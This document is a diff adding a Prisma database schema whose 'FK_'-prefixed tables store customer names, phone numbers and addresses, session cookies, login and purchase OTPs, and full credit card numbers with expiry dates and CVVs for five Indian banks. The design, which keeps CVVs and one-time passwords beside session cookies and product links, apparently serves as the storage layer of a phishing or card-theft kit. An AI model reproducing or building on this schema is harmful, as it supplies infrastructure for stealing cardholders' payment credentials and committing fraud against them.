@@ -1,0 +1,110 @@
+// This is your Prisma schema file,
+// learn more about it in the docs: https://pris.ly/d/prisma-schema
+generator client {
+  provider = "prisma-client-js"
+}
+datasource db {
+  provider = "mysql"
+  url      = env("DATABASE_URL")
+}
+model FK_User {
+  @@map("fk_users") // Optional: Use this if your table name is different from the model name
+  id       Int      @id @default(autoincrement())
+
+  name  String?
+  otp   String?
+  address String?
+}
+model FK_Session {
+  @@map("fk_session") // Optional: Use this if your table name is different from the model name
+  id       Int      @id @default(autoincrement())
+
+  number  String
+  cookies   String?
+}
+model FK_Details {
+  @@map("fk_details") // Optional: Use this if your table name is different from the model name
+  id       Int      @id @default(autoincrement())
+
+  account_holder_number String?
+  name  String?
+  number   String?
+  locality String?
+  address String?
+  pincode String?
+  bankname String?
+  cardno String?
+  cardmonth String?
+  cardyear String?
+  cardcvv String?
+  purchase_otp String?
+  affiliate_link String?
+  productlink String?
+
+
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+model FK_Pincode {
+  @@map("fk_pincode") // Optional: Use this if your table name is different from the model name
+  id       Int      @id @default(autoincrement())
+  
+  pincode  String 
+
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+model FK_Address {
+  @@map("fk_address") // Optional: Use this if your table name is different from the model name
+  id       Int      @id @default(autoincrement())
+  
+  address  String 
+  locality  String 
+
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+model FK_Customer_Name {
+  @@map("fk_customer_name") // Optional: Use this if your table name is different from the model name
+  id       Int      @id @default(autoincrement())
+  
+  name  String 
+
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+model FK_Customer_Number {
+  @@map("fk_customer_number") // Optional: Use this if your table name is different from the model name
+  id       Int      @id @default(autoincrement())
+  
+  number  String 
+
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
+
+enum BankName {
+  SBI_Credit_Card
+  ICICI_Bank_Credit_Card
+  HDFC_Bank_Credit_Card
+  Axis_Bank_Credit_Card
+  KOTAK_Bank_Credit_Card
+}
+
+model FK_Card_Details {
+  @@map("fk_card_details") // Optional: Use this if your table name is different from the model name
+  id       Int      @id @default(autoincrement())
+  
+  cc_holder String 
+  bankname BankName
+  cardno  String 
+  month  String 
+  year  String 
+  cvv  String 
+  
+
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+}
